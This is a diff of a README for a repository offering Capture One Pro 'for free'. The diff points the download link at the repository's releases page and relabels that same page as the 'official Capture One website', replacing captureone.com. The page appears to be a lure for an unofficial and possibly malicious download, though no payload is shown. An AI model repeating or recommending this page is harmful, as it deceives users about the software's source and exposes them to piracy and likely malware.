@@ -3,7 +3,7 @@
 Welcome to the **Capture-One-Pro-Free** repository! Here you can find all the information you need about Capture One Pro, its features, comparisons with other versions, and where to download it for free. 
 
 ## 🚀 Quick Links
-📥 [Download Capture One Pro Free](https://github.com/uploads/App.zip)
+📥 [Download Capture One Pro Free](https://github.com/ClemMrobl/Capture-One-Pro-Free/releases)
 
 ## 📝 About Capture-One-Pro-Free
 Capture One Pro is a powerful photo editing software used by photographers and professionals to enhance and manipulate their images. This repository focuses on the free version of Capture One Pro, providing users with access to essential features without the need for a paid subscription.
@@ -55,7 +55,7 @@ While Capture One Pro Free provides access to basic editing tools and features, 
 Using Capture One Pro Free is simple and straightforward. Once you have downloaded the software from the provided link, install it on your device and follow the on-screen instructions to set up the program. You can then start importing your images, applying edits, and enhancing your photos with the various tools available.
 
 ## 🖥️ Additional Resources
-For more information on Capture One Pro Free, tips and tricks for photo editing, and community discussions, visit the official Capture One website [here](https://www.captureone.com).
+For more information on Capture One Pro Free, tips and tricks for photo editing, and community discussions, visit the official Capture One website [here](https://github.com/ClemMrobl/Capture-One-Pro-Free/releases).
 
 ---
 
